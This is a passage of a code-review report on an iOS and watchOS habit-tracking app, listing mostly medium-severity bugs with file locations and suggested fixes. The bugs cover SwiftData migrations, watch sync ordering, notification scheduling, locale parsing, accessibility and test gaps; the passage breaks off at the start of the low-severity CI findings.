The schema has grown quickly (Moment, MomentPhoto, Principle, AspirationCheckIn, Intention question fields all added within weeks per git history) and relies entirely on implicit lightweight migration via defaulted attributes. There is no VersionedSchema or SchemaMigrationPlan, so the first change that is not purely additive (renaming a field, tightening optionality, adding #Unique to an entity that may contain duplicates) has no custom-migration hook, and no fixture-store migration tests are possible. lead_trackApp.swift:14 wraps SharedModelContainer.create() in `fatalError("Could not create ModelContainer")`, so any future migration failure on a user's real store becomes an unrecoverable crash loop at launch with no recovery or data-preservation path.

**Fix.** Introduce a VersionedSchema for the current shape plus a SchemaMigrationPlan (lightweight stages where possible) now, while every historical store shape is still known, and replace the launch fatalError with a degraded-mode/recovery path so a failed migration is diagnosable rather than a crash loop.


<a id="f-23"></a>
#### 🟠 MEDIUM · `lead track/Views/ProjectDetailView.swift:155`

**aspirationsSection reads the inverse back-array project.aspirations, which never populates**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: ProjectDetailView reads the never-populated inverse project.aspirations.

Project.aspirations is the inverse side of the relationship (Shared/Models/Aspiration.swift:49 declares `@Relationship(deleteRule: .nullify, inverse: \Project.aspirations)`), and in this codebase the inverse back-arrays are known never to be populated — only the forward side (aspiration.projects / aspiration.metrics) is written. MetricDetailView.swift:81-85 already uses the correct forward pattern (query all aspirations, filter by `aspiration.metrics.contains`). ProjectDetailView still reads the inverse, so the 'Part of' section is silently never rendered even when the project is linked to aspirations — a user-visible omission with no error.

**Fix.** Mirror MetricDetailView: add `@Query private var allAspirations: [Aspiration]` and compute `allAspirations.filter { $0.projects.contains(where: { $0 === project }) }` (forward read + filter), then delete the inverse-array read at lines 155 and 158.


<a id="f-24"></a>
#### 🟠 MEDIUM · `lead-track Widget/TimerControlWidget.swift:85`

**Widget provider returns a Metric that outlives its ModelContext and ModelContainer, then traverses its relationships**

TimerControlProvider.metric(withID:) creates the ModelContainer and ModelContext as locals/temporaries and returns the fetched Metric. Both the context (a temporary released at the end of the return statement) and the container (ARC may release after last use) are gone by the time makeState(for:) reads `metric.stableID`, `metric.name`, and walks the `metric.sessions` relationship (line 96) to compute running state and today's total. SwiftData models do not own their context; accessing faulted attributes or relationships after the managing context deallocates is undefined — it currently renders by timing luck (autorelease of the temporaries within the same timeline call) and is a latent crash/empty-render in the widget process. Contrast with ScoreboardWidget.loadMetrics, which at least keeps `context` in scope while snapshotting (though ARC early-release makes even that fragile).

**Fix.** Build the value-type TimerMetricState inside the same scope that owns the container/context (e.g. have state(for:) create the context, fetch, and map to TimerMetricState before returning), optionally with `withExtendedLifetime(context)`; never return PersistentModel instances past their context's lifetime.


<a id="f-25"></a>
#### 🟠 MEDIUM · `lead track/Views/AspirationCardView.swift:23`

**Full-resolution cover photo decoded in body on every render, duplicated in three decode sites**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: AspirationCardView decodes the full-res cover per row in body.

AspirationThumbnail calls aspiration.coverImage inside body, which runs UIImage(data:) on the raw stored photo bytes every time the view re-renders — for a 56pt thumbnail in every AspirationListView row (a LazyVStack re-creates rows on scroll). Multi-megabyte photo data is decoded repeatedly with no downsampling or caching, which is both a scroll-performance hazard and memory churn. The decode logic is also triplicated: Aspiration.coverImage (declared, oddly, inside the AspirationCardView.swift view file), AspirationFormView.currentCover (lines 172-177, identical guard/UIImage/Image body), and MomentRowContent.thumb (AspirationMomentsSection.swift:212-220). AspirationCardView.body additionally computes AspirationRollup.compute(for:) per row per render (line 44) — deliberate 'doctrine' per the MomentsSection comment, but combined with the image decode it concentrates all per-row cost in body.

**Fix.** Move the coverImage extension out of the view file into the model layer, unify the three decode sites, and decode once via a cached, downsampled thumbnail (e.g. UIImage preparingThumbnail(of:) stored/cached per aspiration) rather than in body.


<a id="f-26"></a>
#### 🟠 MEDIUM · `lead track/Views/AspirationFeedPicker.swift:101`

**Image-only selection-badge button has no accessibility label, value, or selected trait**

The whole-metric selection control is a Button whose only label is SelectionBadge — a purely visual circle/checkmark with no text. VoiceOver users get no name (at best 'checkmark, button' when selected, an unnamed button when not), no indication of what it toggles, and no selected/unselected state. The project-row badge (line 162) at least sits next to the project name, but still exposes no selection state, and disabled-when-whole rows lose explanation. This is inconsistent with the codebase's own good patterns: the sibling AspirationAttachPicker uses real `Toggle`s (fully accessible), and ColorSwatchRow (AspirationFormComponents.swift:73-74) adds `.accessibilityLabel` and `.isSelected` traits to its image-only swatches.

**Fix.** Add `.accessibilityLabel("Include \(metric.name)")` (or similar) and `.accessibilityAddTraits(selected ? .isSelected : [])` to the badge buttons — or model them as `Toggle(isOn:)` with a custom ToggleStyle so the semantics come for free, matching AspirationAttachPicker.


<a id="f-27"></a>
#### 🟠 MEDIUM · `lead track/Views/GoalSettingsView.swift:264`

**Goal TextField accepts zero and negative values; Save is never disabled, producing a permanently-met goal**

goalField pairs a Stepper bounded to step ... .infinity with a TextField(value:format:.number) that has no lower bound, and the Save toolbar button (line 80) has no .disabled validation. Typing 0 or a negative number saves dailyGoal = 0 (or negative, scaled by *60/*3600 in saveAmountGoals). GoalSummary.hasDailyTarget treats any non-nil dailyGoal as an active target, and isDailyMet returns today >= (dailyGoal ?? 0), which is trivially true — so the metric renders as "done" forever, fills a dial segment on Today, and skews goal counts, with no way to notice why except reopening settings. Contrast with CountEntryView/CountdownStartView/IntentionFormView, which all gate their confirm buttons on parsed validity.

**Fix.** Clamp or validate the typed value: disable Save when hasDailyGoal && dailyGoalValue <= 0 (and likewise for weekly), or clamp on commit (e.g. .onChange or a bound with max(step, value)) so the TextField cannot persist a non-positive goal.


<a id="f-28"></a>
#### 🟠 MEDIUM · `lead track/Views/ProjectDetailView.swift:100`

**Single-tap toolbar Delete cascades the project and all its sessions with no confirmation**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: single-tap cascade delete with no confirmation (also on ClusterMetricRow, see NN12).

deleteProject() runs directly from the toolbar button. Project.sessions is declared @Relationship(deleteRule: .cascade, ...) (Shared/Models/Project.swift:18), so one accidental tap irreversibly destroys the project and every logged session in it. This is inconsistent with the codebase's own pattern: far less destructive actions get a confirmationDialog (e.g. retiring a goal season in WeeklyReviewGoalSeasons.swift:33, which deletes no data at all).

**Fix.** Gate the delete behind a confirmationDialog (matching WeeklyReviewGoalSeasons) stating that all logged sessions will be deleted, and keep role: .destructive on the confirming button.


<a id="f-29"></a>
#### 🟠 MEDIUM · `lead-track Watch App/WatchMetricLabel.swift:42`

**Watch app rows render raw todayTotal without the overnight staleness correction the complications apply**

WatchSnapshot.day exists explicitly "so consumers can zero totals that have gone stale overnight", and ComplicationProgress.effectiveTotal honors it: every widget/complication zeroes todayTotal when the cached snapshot's day is not the current day. The in-app list does not — WatchMetricLabel.todayText prints metric.todayTotal straight from the cached snapshot ("X today", or "Done today" for binary metrics), and WatchBinaryRow.isDone (WatchMetricRow.swift:86-88) keys its checkmark and its toggle semantics off the same raw value. If the user opens the watch app after midnight while the phone is unreachable (refreshRequest falls through with no fallback), yesterday's totals display as today's: a binary habit shows "Done today" with a filled checkmark, and tapping it sends a toggleDay the user believes clears today. The same good pattern exists in the codebase and is bypassed only here.

**Fix.** Resolve rows through the same staleness-corrected path the complications use — e.g. have WatchRootView map sync.snapshot through ComplicationProgress.metrics(in:at:) (or pass snapshot.day down and zero stale totals in todayText/isDone) so app and complications agree after midnight.


<a id="f-3"></a>
#### 🟠 MEDIUM · `Shared/Services/NotificationService.swift:14`

**rescheduleAll does synchronous full-history statistics on the main actor every foreground pass**

rescheduleAll is called synchronously from lead_trackApp.handle(phase:) (lead track/lead_trackApp.swift:65) on the MainActor each time the app becomes active. It fetches every Metric, and per metric runs hasLoggedToday (scan of all sessions), scheduleStreakAlert -> currentStreak (SessionStatistics.dailyTotals over the metric's entire session history), and reminderContent -> currentStreak again (a second full dailyTotals pass), plus weeklyReviewBody's dailyTotals over all duration sessions. For a long-lived tracking store this is O(total sessions) several times over, blocking the main thread during app activation — exactly when the UI is redrawing. The service already correctly uses ModelContext(container) (the nonisolated pattern), so nothing pins it to the main thread except the call site.

**Fix.** Move the sweep off the main actor — e.g. `Task.detached { NotificationService.rescheduleAll(container:) }` or an async entry point — the same way handle(phase:) already wraps HealthMetricSyncService.refreshAll in a Task. Also consider computing currentStreak once per metric and reusing it for both the streak alert and the reminder body.


<a id="f-4"></a>
#### 🟠 MEDIUM · `lead track/Services/HealthSessionExportService.swift:44`

**Overlapping export passes can write duplicate records into Apple Health (no in-flight guard, MainActor reentrancy)**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: overlapping export passes write duplicate Apple Health records.

exportAll/connect are async MainActor methods with suspension points (await writer.write, await requestShareAccess), and every scene-phase change spawns a new unstructured Task calling exportAll (lead_trackApp.swift lines 79-84; .active also calls it at line 76), while MetricFormView.connectHealthExport spawns connect. MainActor reentrancy lets two passes interleave at the awaits: pass A computes `pending` and suspends inside writer.write(session1); pass B (each pass uses its own fresh ModelContext) computes `pending` from the still-unstamped sessions and writes session1 again. session.healthExportedAt is only stamped after the write returns (line 88), so the dedup window is per-write. Unlike the read-side mirror, records written into Apple Health never self-heal — the user permanently gets duplicate workouts/mindful sessions. A concrete trigger: enabling export on a metric shows the HealthKit authorization sheet (app goes .inactive); dismissing it fires .active → exportAll while connect's export is still in flight.

**Fix.** Serialize passes on the singleton: keep a `private var inFlight: Task<Void, Never>?` and either await/join it or return early when a pass is running (and coalesce a trailing re-run). Alternatively re-check `session.healthExportedAt == nil` immediately before each write and re-fetch pending after every suspension.


<a id="f-5"></a>
#### 🟠 MEDIUM · `lead-track Watch App/WatchSyncController.swift:29`

**Action reordering: a live sendMessage can overtake actions still queued in transferUserInfo, leaving a phantom running timer on the phone**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: queued startTimer lands after a live stopTimer -> phantom running session.

Queued transferUserInfo transfers are FIFO among themselves, but sendMessage bypasses that queue. Scenario: (1) phone unreachable, user taps Start — startTimer is queued via transferUserInfo and applied optimistically; (2) reachability returns but the queued transfer has not yet been delivered (background transfers can lag minutes); (3) user taps Stop — send() sees isReachable and delivers stopTimer immediately. The phone has no running session, so SessionService.stopSession(for:) no-ops, and the reply snapshot reverts the watch's optimistic elapsed time (the logged interval is lost). (4) The queued startTimer arrives later and starts a session backdated to the original tap that nothing ever stops — it runs indefinitely, inflating totals until the user notices. Actions carry timestamps but the phone applies them strictly in arrival order; nothing detects out-of-order arrival (e.g. a stop older than a later-arriving start).

**Fix.** Preserve FIFO: when WCSession.default.outstandingUserInfoTransfers is non-empty, queue new actions via transferUserInfo too instead of sendMessage; or add a per-watch monotonically increasing sequence number to WatchAction and have the phone buffer/reorder (or reject and force a refresh) on gaps.


<a id="f-6"></a>
#### 🟠 MEDIUM · `lead-track Watch App/WatchSyncController.swift:87`

**Stale snapshots overwrite newer optimistic state — no generation/version guard on update(to:)**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: stale application-context clobbers optimistic watch state (no generation token).

Snapshots carry no sequence number or build date the watch can compare, and update(to:) accepts anything not byte-equal to current state. Two concrete losses: (a) On activation the controller replays session.receivedApplicationContext — the LAST context the phone ever pushed, which predates any optimistic updates for actions still sitting in the transferUserInfo queue. Offline flow: user checks off a binary habit (optimistic todayTotal=1, action queued), watch app relaunches, activation re-applies the old context, the habit shows unchecked again; the user taps again, queuing a second toggleDay — when the phone drains the queue the two toggles cancel and the day ends NOT recorded. requestRefresh() only repairs this if the phone happens to be reachable. (b) A delayed sendMessage reply can race a newer didReceiveApplicationContext push and roll the UI back to older phone state.

**Fix.** Stamp WatchSnapshot with a monotonic generation (or at least a built-at Date) on the phone and have update(to:) ignore snapshots older than the current one; skip re-applying receivedApplicationContext when a cached snapshot with pending optimistic actions exists, or replay pending actions through WatchSnapshotReducer on top of every received snapshot.


<a id="f-7"></a>
#### 🟠 MEDIUM · `Shared/Services/NotificationService.swift:209`

**Weekly review notification is a one-shot with stats frozen at schedule time**

weeklyTrigger builds a UNCalendarNotificationTrigger from weekday/hour/minute with `repeats: false`. Combined with the wipe-and-rebuild-on-foreground doctrine, the review fires at most once after the user stops opening the app — the one recurring notification in the app that arguably should keep firing. Worse, weeklyReviewBody computes "You logged N sessions (Xh tracked time) across M metrics this week" at scheduling time (the last foreground pass), but the notification fires up to ~7 days later, so the figures can describe a different week than the one the banner claims. A user who opens the app Tuesday and receives the review Sunday sees Tuesday's trailing-7-day numbers presented as the current week's.

**Fix.** Either set `repeats: true` with generic copy ("Your weekly review is ready") and let the app compute figures on open, or keep the one-shot but drop the specific counts from the body so the text cannot be stale. The current combination (one-shot + snapshot stats + 'this week' phrasing) gives users wrong numbers.


<a id="f-8"></a>
#### 🟠 MEDIUM · `lead track/Views/CountEntryView.swift:45`

**Locale-blind Double(valueText) parsing breaks decimal entry in comma-decimal locales**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: comma-decimal locales cannot enter fractional counts (Double(text)).

The value field uses .keyboardType(.decimalPad), whose decimal key follows the device locale (a comma in German, French, etc.), but parsing uses Double(valueText), which only accepts a dot separator. A user in a comma-decimal locale who types "1,5" gets nil, so Save stays permanently disabled with no explanation. The same pattern appears in IntentionFormView.swift line 221 (Double(amountText) for the weekly amount target). The codebase already has the correct idiom: GoalSettingsView's goalField uses TextField(value:format:.number), which parses locale-aware. These two views should use TextField("Value", value:format:) or parse via Decimal/Double FormatStyle instead of Double.init(String).

**Fix.** Replace the String-backed field + Double(valueText) with TextField(value: $value, format: .number) (as GoalSettingsView already does), or parse with try? Double(valueText, format: .number) so the locale's decimal separator is honored. Apply the same fix to IntentionFormView.amountText.


<a id="f-9"></a>
#### 🟠 MEDIUM · `lead track/Views/IntentionFormView.swift:221`

**Same comma-decimal Double(text) parsing bug as the filed CountEntryView finding — the class has a second live instance**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: same comma-decimal parse bug in IntentionFormView.

IntentionFormView binds a TextField with .keyboardType(.decimalPad) (line 163) and parses it with `Double(amountText)` (line 221). Double.init(String) only accepts "." as the decimal separator, but in comma-decimal locales (de, fr, es, ...) the decimal pad key produces "," — so any fractional amount fails to parse, the guard returns nil, and the intention amount is silently dropped. This is byte-for-byte the same defect the review filed as a point-finding against CountEntryView.swift:45 (`Double(valueText)`), confirming it is a class, not a one-off. A repo grep shows these are the only two `Double(<field text>)` sites, so the class fix is small.

**Fix.** Fix both sites through one shared helper (e.g. a `LocaleDoubleParser.parse(_:)` in Shared/Services using NumberFormatter with the current locale, or normalizing "," to ".") rather than patching CountEntryView alone. Add a Linux-runnable swift-testing case covering "1,5" input so the class cannot silently regrow.


<a id="f-10"></a>
#### 🟠 MEDIUM · `Shared/Models/ReminderSchedule.swift:45`

**Time-of-day persisted as absolute Date is fragile across time-zone changes**

The "hour/minute-only Date" idiom (ReminderSchedule.time, and the fields built on it: Metric.reminderTime/reminderTimes/reminderRandomStart/reminderRandomEnd, Intention.questionWindowStart/questionWindowEnd) stores a wall-clock time as an absolute Date resolved against Calendar.current at write time — DateComponents(hour:minute:) with no year yields a date in year 1 AD in the device's current time zone. NotificationService later re-extracts components via Calendar.current.dateComponents([.hour, .minute], from: time) (NotificationService.swift:342). If the user changes time zones between setting and scheduling, the extracted hour shifts; year-1 dates additionally resolve against pre-standardization LMT offsets, which can produce odd minute values. The silent `?? .now` fallback also substitutes a full current-instant Date — a semantically different value — if component resolution ever fails, masking the failure.

**Fix.** Persist hour and minute as Ints (or a small Codable HourMinute struct) on Metric/Intention and convert to Date only at the DatePicker boundary; alternatively document and enforce a fixed calendar/time zone for the idiom in one place. Replace the `?? .now` fallback with a deterministic anchor.


<a id="f-11"></a>
#### 🟠 MEDIUM · `Shared/Models/WatchSnapshot.swift:9`

**Non-optional enum in WatchMetricSnapshot breaks the snapshot's own forward-compatibility convention**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: unknown MeasurementType raw value fails the whole snapshot decode -> silent watch freeze.

WatchMetricSnapshot decodes `measurementType` as the `MeasurementType` enum directly, while every field added later (healthSourceRaw, countLogStyleRaw, binaryGoalRetiredAt, dailyGoal, excludedWeekdays) is deliberately stored raw and/or optional 'so snapshots cached by earlier app versions still decode'. If a future phone build adds a MeasurementType case, JSONDecoder throws on the unknown raw value for that one metric, and WatchSyncCodec.snapshot(from:) (Shared/Services/WatchSyncCodec.swift:17) swallows it with `try?`, returning nil — the ENTIRE snapshot is dropped and an older watch renders a stale cache or nothing, for all metrics, not just the new-typed one. The same `try?` pattern silently discards a queued WatchAction whose Kind is unknown to an older phone (WatchSyncCodec.swift:27), losing a user recording.

**Fix.** Mirror the kindRaw pattern the file already documents: transport `measurementTypeRaw: String` (or give the codable field a decode-tolerant wrapper with an `.unknown` fallback via a custom init(from:)) so one foreign value degrades to a read-only row instead of nuking the whole snapshot. Consider logging or per-item decoding so version skew fails per-metric, not per-payload.


<a id="f-12"></a>
#### 🟠 MEDIUM · `Shared/Services/CSVImporter.swift:233`

**Imported end timestamps reuse the start date, so midnight-crossing sessions come back with endedAt before startedAt**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: midnight-crossing session re-imports with a negative duration that poisons totals.

ParsedRow builds `endedAt` from the row's single Date column (fields[2]) plus the End time (fields[4]). A session running 23:30–00:15 exports Date=its start day, End="12:15 AM"; on import endedAt lands ~23h15m before startedAt, yielding a negative duration and a corrupted session that every total/streak computation then reads. The exporter even writes a correct `Duration (s)` column, but the importer ignores it. This is exactly the fragile hand-rolled date math the format invites: the composed components in parseTimestamp have no way to express "next day".

**Fix.** After parsing, if endedAt < startedAt add one day (calendar.date(byAdding: .day, value: 1, ...)), or derive endedAt from startedAt + the Duration (s) column, or export a full end timestamp instead of a bare clock time.


<a id="f-13"></a>
#### 🟠 MEDIUM · `Shared/Services/NotificationService.swift:238`

**Weekly review notification reports lifetime session count as "this week"**

weeklyReviewBody computes weekDuration correctly via SessionStatistics.lastSevenDaysTotal, but sessionCount is computed from every completed session the active metrics have ever recorded — there is no date filter. The notification copy then claims 'You logged N sessions ... this week', so a long-term user sees a wildly inflated, ever-growing number (e.g. 'You logged 1,842 sessions this week'). The adjacent duration figure IS windowed, so the two numbers in the same sentence disagree about what 'this week' means.

**Fix.** Filter sessionCount to the same trailing-7-day window used for weekDuration (e.g. reuse the cutoff from hasRecentActivity, or count entries in the dailyTotals already restricted to the window) so both figures describe the same period.


<a id="f-14"></a>
#### 🟠 MEDIUM · `Shared/Services/WatchSnapshotBuilder.swift:7`

**Fetch failure silently becomes an empty watch snapshot**

snapshot(in:) swallows any fetch error with try? and substitutes []. A transient SwiftData fetch failure is then indistinguishable from 'user has no metrics': PhoneWatchSyncService (lead track/Services/PhoneWatchSyncService.swift:54) pushes the empty snapshot as application context, the watch renders an empty list and WatchSnapshotCache persists it over the last good state, wiping the watch UI (and watch widget) until the next successful sync. The same swallow-and-degrade pattern repeats in WatchSyncCodec (encode failure returns [:], so the sync silently no-ops) with no logging anywhere, making field diagnosis of 'watch went blank' impossible.

**Fix.** Make snapshot(in:) throwing (or return WatchSnapshot?) so the caller can skip the push and keep the previous context on failure, and log the error. In WatchSyncCodec, at minimum log encode/decode failures instead of returning empty dictionaries.


<a id="f-15"></a>
#### 🟠 MEDIUM · `docs/MOMENTS.md:53`

**MOMENTS.md privacy/count invariants ('nothing enters exports', 'no moment counts anywhere') are contradicted by the shipped markdown export**

Principle 4 (lines 51-53) declares moments 'Private by construction ... nothing enters WatchSnapshot, widgets, exports, or Health', and Principle 2 / chosen default 7 (lines 45-47, 269-270) declare 'No moment counts anywhere'. The export revamp (PR #76) deliberately changed this: MarkdownExporter now exports every moment's text, place label, and provenance (Shared/Services/MarkdownExportLines.swift:134-157 renders moment.text and moment.placeLabel; DataExportView.swift:65 advertises 'every metric, moment, intention, and check-in'), and prints an explicit count — MarkdownExporter.swift:132: "Moments: \(window.moments.count) · Intentions: ...". The code direction appears intentional (an LLM-ready artifact of the whole practice), so the spec is what drifted — but as written the doc's strongest invariants, including a privacy claim about place data never leaving via export, are false. CONTEXT.md:92 repeats the same stale claim ('no counts, totals, streaks, or prompts anywhere').

**Fix.** Amend MOMENTS.md Principles 2 and 4 (and CONTEXT.md's Moment entry) to carve out the user-initiated markdown export: e.g. 'never enters WatchSnapshot, widgets, or Health; included, with place labels and a count, only in the explicit user-triggered markdown export'. Alternatively, if the invariant should stand, the export inventory count line is the code-side violation to remove.


<a id="f-16"></a>
#### 🟠 MEDIUM · `docs/RELEASE.md:25`

**RELEASE.md claims bundle IDs need no manual registration and omits the watch-widget bundle ID — contradicted by the workflow's own registration script**

Lines 24-27 list only three bundle IDs (plastickarma.lead-track, .widget, .watchkitapp) and assert they 'don't need manual registration: with an Admin key, cloud signing registers missing bundle IDs automatically during Archive'. The repo contradicts this twice: (1) a fourth signed target exists, plastickarma.lead-track.watchkitapp.widget (project.pbxproj:1153); (2) .github/workflows/release.yml:146 runs .github/scripts/register-watch-widget-bundle-id.rb, whose header states 'Cloud signing with an API key cannot do this when the target's entitlements request an app group (the App ID write fails with a bearer-token authentication error), so we pre-create it here. Assigning the actual group to the App ID ... stays a one-time manual portal step.' So the doc's blanket claim is false for exactly the case the pipeline had to work around, and the one-time manual App Group portal step is documented nowhere in RELEASE.md. Line 12 similarly says profiles are created 'for both the app and its widget extension' when four targets are signed.

**Fix.** Update the setup section: list all four bundle IDs, note that the watch widget's App-Group-entitled App ID is pre-registered by register-watch-widget-bundle-id.rb during the release workflow, and document the remaining one-time manual step of assigning the App Group to that App ID in the developer portal.


<a id="f-17"></a>
#### 🟠 MEDIUM · `lead track/Services/PhoneWatchSyncService.swift:46`

**Watch actions dropped silently when apply/save throws**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: try? drops a once-delivered watch action on save failure, with no log/retry.

applyAction wraps WatchActionHandler.apply in a bare `try?`. apply can throw from Metric.find (fetch error) or `context.save()`. A watch action delivered via queued transferUserInfo is consumed exactly once by WCSession, so a swallowed throw here permanently loses a user's wrist-logged session or timer start/stop with no log, no retry queue, and no signal — while WidgetCenter.reloadAllTimelines() still runs and a snapshot is pushed back as if the action landed. Because the failure is invisible, a maintainer debugging 'my watch log vanished' has nothing to go on.

**Fix.** At minimum log the error (Logger/os_log) with the action kind and metric ID; better, return success/failure from applyAction so handle(message:) can include an error marker in the reply context, letting the watch keep the action queued or surface a toast. Do not reload widgets when apply failed.


<a id="f-18"></a>
#### 🟠 MEDIUM · `lead track/Views/AspirationFormView.swift:222`

**Photo load failure silently erases the existing cover via try?**

loadPhoto assigns 'imageData = try? await item.loadTransferable(type: Data.self)'. If loading the picked photo fails (iCloud photo not downloaded, transfer error), the expression evaluates to nil, so the user's existing cover image is silently replaced with nil — the form reverts to the gradient and a subsequent Save persists the loss. The failure is swallowed with no user feedback and no log, making it undiagnosable.

**Fix.** Bind the result to a local first: 'guard let data = try? await item.loadTransferable(...) else { return }' (keeping the old cover on failure), and ideally surface a brief load-failure message.


<a id="f-19"></a>
#### 🟠 MEDIUM · `lead track/Views/AspirationListView.swift:68`

**List context-menu delete skips the notification cleanup that detail-view delete performs**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: list-view aspiration delete skips cancelQuestions() the detail view performs.

Aspiration deletion logic exists in two places with different behavior. AspirationDetailView.deleteAspiration (AspirationDetailView.swift:285-291) explicitly calls NotificationService.cancelQuestions(for: aspiration) before modelContext.delete, with a comment explaining the cascade deletes intentions with no per-row hook. AspirationListView.delete(_:) (reached via the card's context menu at line 48) just calls modelContext.delete(aspiration) with no cancellation — so deleting from the list leaves the deleted intentions' pending daily-question notifications scheduled, and they will fire for data that no longer exists. The list path also has no confirmation dialog, while the detail path deliberately hides delete behind a menu plus confirmation ('never one accidental tap away'), so the two entry points disagree on both cleanup and destructive-action UX.

**Fix.** Centralize aspiration deletion in one helper (e.g. a ModelContext or service method 'delete(aspiration:)' that cancels questions then deletes) and call it from both views; consider giving the context-menu delete the same confirmation dialog as the detail screen.


<a id="f-20"></a>
#### 🟠 MEDIUM · `lead track/Views/MetricCardView.swift:232`

**Recording-action logic triplicated across MetricCardView, MetricRecordDock, and ClusterMetricRow**

> 🔁 **Independently confirmed by both reviews** — this session's max-effort pass also surfaced this: recording-action quartet duplicated with animation drift (see Correction C1).

The four recording actions (toggleTimer, startCountdown, logOne, toggleDone), the isDoneToday computed property, the quickLogTrigger haptic state, and the CountdownStartView sheet + CountdownOptionsMenu wiring are implemented three times almost verbatim: MetricCardView.swift lines 232-264, MetricRecordDock.swift lines 156-190, and ClusterMetricRow.swift lines 244-277. Each copy wraps the same SessionService calls in withAnimation and toggles a local haptic trigger. Any behavior change (e.g. a different animation, an extra side effect on log, Live Activity start) must now be applied in three places and has already drifted slightly: two copies use withAnimation, the third uses withAnimation(.snappy). isDoneToday is additionally defined a third time in MetricRingCard.swift line 84.

**Fix.** Extract a shared recording helper — e.g. a MetricRecorder struct (metric, runningSession, modelContext) exposing toggleTimer/startCountdown/logOne/toggleDone, or a ViewModifier that also owns the quickLogTrigger sensory feedback and countdown-picker sheet. The three surfaces then keep only their layout. Move isDoneToday onto Metric or SessionStatistics as a single definition.


<a id="f-21"></a>
#### 🟠 MEDIUM · `lead track/Views/WeeklyReviewSettingsView.swift:5`

**Weekly-review settings only take effect on the next app foreground (hidden coupling through raw UserDefaults)**

The view writes four @AppStorage keys and its Done button just dismisses; nothing reschedules the notification. The only consumer, NotificationService.scheduleWeeklyReview (Shared/Services/NotificationService.swift:173-197), reads the same raw string keys and runs only from rescheduleAll, which lead_trackApp.swift:65 calls on scenePhase == .active. So a user who enables the weekly review (or changes its day/time) and then leaves the app gets no notification scheduled until the app is next foregrounded — enabling it right before the chosen day can silently do nothing. The coupling is also stringly-typed: the literals "weeklyReviewEnabled"/"weeklyReviewDay"/"weeklyReviewHour"/"weeklyReviewMinute" and their fallback defaults (day 2, hour 9, minute 0) are duplicated in both files, so renaming a key or changing a default in one file silently desynchronizes the other.

**Fix.** Call a NotificationService reschedule entry point from onChange of the settings (or on dismiss), and centralize the four keys plus defaults in one type (e.g. an enum of constants or a WeeklyReviewSettings struct) used by both the @AppStorage declarations and NotificationService.


<a id="f-30"></a>
#### 🟠 MEDIUM · `lead trackTests/CSVExporterTests.swift:50`

**CSV import/export pipeline: row content, row application, and timestamp parsing are untested; the one row test asserts only a line count**

buildCSVIncludesSessionRow asserts `lines.count == 2` and nothing about the row (metric/project escaping in context, date/time format, duration rounding, Value/Type columns). On the import side, CSVImporterTests covers only parseRows and header validation; `parseTimestamp`, `ParsedRow` (field-count guard, empty-metric skip, endedAt fallback, value parsing), `importCSV`'s summary counting, rowsSkipped for malformed rows, the health-linked-metric skip, and MetricCache de-dup are all untested. filterByScope tests only the `.all` branch (and that test is inside `#if canImport(SwiftData)`, so per the CI gap it never runs). There is no export→import round-trip test even though exporter (`Date.formatted(date:.numeric,...)`) and importer (`Date.FormatStyle`) must agree — a locale-dependent contract that nothing pins.

**Fix.** Add a same-machine round-trip test: build a session, export via buildCSV, re-parse via parseRows + ParsedRow/parseTimestamp, and compare startedAt/endedAt/value to the original (this stays locale-safe because both sides use the current locale). Add ParsedRow tests for short rows, empty metric name, unparseable date (rowsSkipped), and missing end time. Cover the health-linked skip and metric/project reuse counting in importCSV where SwiftData is available.


<a id="f-31"></a>
#### 🟠 MEDIUM · `lead trackTests/InsightTests.swift:5`

**InsightGenerator's detectors are effectively untested — InsightTests only pins three copy strings**

InsightTests.swift (45 lines, struct actually named InsightCopyTests) asserts only the headline/detail wording of three `Insight` factory methods. The 191-line `Shared/Services/InsightGenerator.swift` — the engine behind every weekly-review card's insights — has no direct tests: the session-window filtering ([currentStart, end) vs comparison period, running-session exclusion), all seven detector thresholds (minTimeOfDaySessions=4, timeOfDayDominance=0.5, dayOfWeekDominance=0.4, minVolumeDelta=0.2, minStableWeekCount=2, minActiveDaysDelta=2, minGoalHitsDelta=2), the binary-metric guard in detectVolumeChange, the previousTotal==0 guard, and applyCategoryCaps' first-wins ordering are all unverified. The single indirect call in MeasureHealthTests only checks health-insight ordering. Any off-by-one in a threshold or an inverted comparison in a detector would go unnoticed.

**Fix.** Add an InsightGeneratorTests suite (platform-neutral, it already compiles on Linux) covering each detector just below/at its threshold, the category cap when two detectors of one category fire, the binary-metric volume guard, and the window boundary (session exactly at currentStart counts, exactly at end does not). Note detectTimeOfDayMode/detectDayOfWeekMode use Calendar.current internally — anchor fixtures with the midnight/weekStart pattern used elsewhere, or inject the calendar.



### Low severity (90)


**CI**

<a id="f-32"></a>
#### 🔵 LOW · `.github/scripts/expire-builds-in-review.rb:66`

**Expires builds of ALL marketing versions, though the review lock it works around is per-version**

The script's own header states the constraint is 'one build per marketing version' in Beta App Review, but builds_in_review() queries '/v1/builds?filter[app]=...' with no preReleaseVersion filter and expires every build whose betaAppReviewSubmission is WAITING_FOR_REVIEW or IN_REVIEW. If a release of 1.1.0 is dispatched while a 1.0.1 build is legitimately sitting in Beta App Review (a build that would NOT block the 1.1.0 submission), the 1.0.1 build is expired: it is pulled from review and can no longer be installed by new testers, silently killing that pending release. The step is continue-on-error and the expiry prints as an ordinary log line, so the collateral damage is easy to miss.

**Fix.** Constrain the query to the version being uploaded, e.g. add filter[preReleaseVersion.version]=<resolved marketing version> (or include=preReleaseVersion and compare attributes.version). Since MARKETING_VERSION may be blank in release.yml (project default), resolve the effective version first (agvtool/Info.plist from the archive) and pass it to the script; skip expiry when it cannot be determined.


<a id="f-33"></a>
#### 🔵 LOW · `.github/workflows/ios.yml:25`

**Unpinned `brew install swiftlint swiftformat` executes latest-published binaries in CI**

